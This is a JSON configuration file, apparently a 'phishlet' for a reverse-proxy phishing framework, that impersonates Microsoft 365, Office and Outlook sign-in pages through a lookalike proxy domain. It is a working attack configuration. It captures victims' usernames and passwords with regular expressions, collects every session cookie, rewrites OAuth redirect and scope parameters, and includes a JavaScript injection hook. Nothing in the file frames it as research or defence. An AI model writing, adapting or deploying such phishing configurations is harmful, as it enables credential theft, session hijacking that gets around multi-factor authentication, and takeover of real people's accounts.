
{
  "name": "office.com",
  "author": "@fluxxset",
  "min_version": "1.0.0",
  "target_url": "https://login.microsoftonline.com/",
  "redirect_url": "https://login.microsoftonline.com/",
  "proxy_domain": "xx.in",
  "proxy_auth": "/xxx/ekfbsejhbesjhfgive",
  "hosts_to_proxy": [
    {
      "host": "login.microsoftonline.com",
      "orignal_subdomain": "login",
      "proxy_subdomain": "login",
      "reverce_filter": true,
      "auto_filter": true
    },
    {
      "host": "www.office.com",
      "orignal_subdomain": "www",
      "proxy_subdomain": "www",
      "reverce_filter": true,
      "auto_filter": true
    },
    {
      "host": "account.live.com",
      "orignal_subdomain": "account",
      "proxy_subdomain": "account",
      "reverce_filter": true,
      "auto_filter": true
    },
    {
      "host": "login.live.com",
      "orignal_subdomain": "login",
      "proxy_subdomain": "login1",
      "reverce_filter": true,
      "auto_filter": true
    },
    {
      "host": "outlook.live.com",
      "orignal_subdomain": "outlook",
      "proxy_subdomain": "outlook",
      "reverce_filter": true,
      "auto_filter": true
    },
    {
      "host": "office.com",
      "orignal_subdomain": "",
      "proxy_subdomain": "",
      "reverce_filter": true,
      "auto_filter": true
    },
    {
      "host": "logincdn.msftauth.net",
      "orignal_subdomain": "logincdn",
      "proxy_subdomain": "logincdn",
      "reverce_filter": true,
      "auto_filter": true
    }
  ],
  "filters": [
    {
      "type": "url",
      "url": "*",
      "method": "GET",
      "locate": ".xx.in%2fv2%2fOfficeHome.All",
      "replace": ".office.com%2fv2%2fOfficeHome.All"
    },
    {
      "type": "url",
      "url": "*",
      "method": "GET",
      "locate": ".xx.in%2flandingv2",
      "replace": ".office.com%2flandingv2"
    },
    {
      "type": "url",
      "url": "*",
      "method": "GET",
      "locate": "?iframed_by=https%3a%2f%2flogin.xx.in",
      "replace": "?iframed_by=https%3a%2f%2flogin.office.com"
    }
  ],
  "auth_urls": [
    "/",
    "/kmsi",
    "/?auth=2",
    "/common/login",
    "/common/oauth2/",
    "/landingv2*",
    "/ppsecure/*",
    "/ppsecure/post.srf*",
    "/landing*",
    "/common/SAS/ProcessAuth"
  ],
  "credentials": [
    {
      "type": "post",
      "name": "username",
      "keyword": "\"username\":\"([^\"]*)",
      "regexp": "true"
    },
    {
      "type": "post",
      "name": "password",
      "keyword": "\"password\":\"([^\"]*)",
      "regexp": "true"
    }
  ],
  "cookies": [
    "*"
  ],
  "force_post": [
    {
      "url": "/session",
      "method": "POST",
      "keyword": "login",
      "regexp": "false",
      "replace_value": "admin"
    }
  ],
  "force_get": [
    {
      "url": "*",
      "method": "GET",
      "keyword": "redirect_uri",
      "regexp": "false",
      "replace_value": "https%3A%2F%2Fwww.office.com%2Flandingv2"
    },
    {
      "url": "*",
      "method": "GET",
      "keyword": "scope",
      "regexp": "false",
      "replace_value": "openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All"
    }
  ],
  "inject_js": [
    {
      "host": "login.microsoftonline.com",
      "url": "/",
      "js_code": "console.log('Hello, world!');"
    }
  ],
  "landing_url": "/",
  "landing_host": "login.microsoftonline.com"
}
